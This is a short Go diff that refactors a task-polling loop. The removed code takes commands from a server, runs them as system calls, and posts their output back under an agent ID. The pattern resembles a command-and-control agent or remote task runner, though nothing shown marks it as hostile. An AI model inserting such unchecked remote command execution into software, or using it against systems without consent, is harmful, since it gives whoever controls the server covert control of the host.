@@ -58,30 +58,14 @@ func main() {
 			for i, task := range res {
 				log.Printf("Task %d: %s", i+1, formatTask(task))
 
-				// Now we'd have to decode the JSON of the tasks to do
-				// Which should have an ID and command(s) to run
-				var instruction = taskValue(task, "instruction")
-
-				if instruction == "syscall" {
-					var cmd = taskValue(task, "arg")
-					log.Printf("Running " + cmd + " for task ID " + taskValue(task, "task_id"))
-
-					var cmdout = GetCommandOutput(strings.Split(cmd, " "))
-
-					result := cloneTask(task)
-					updateTaskValue(result, "stdout", cmdout)
-					updateTaskValue(result, "stderr", "")
-					updateTaskValue(result, "exit_code", 0)
-					updateTaskValue(result, "stopped_processing_at", time.Now().Format(time.RFC3339))
-					updateTaskValue(result, "responded", true)
-
-					_ = submitTaskResult(server, agent_id, result)
-					log.Printf("Submitting task result for task ID " + taskValue(task, "task_id"))
-
+				if !processTask(server, agent_id, task) {
+					running = false
+					break
 				}
+			}
 
-				// Then we would post it back
-
+			if !running {
+				break
 			}
 
 		}
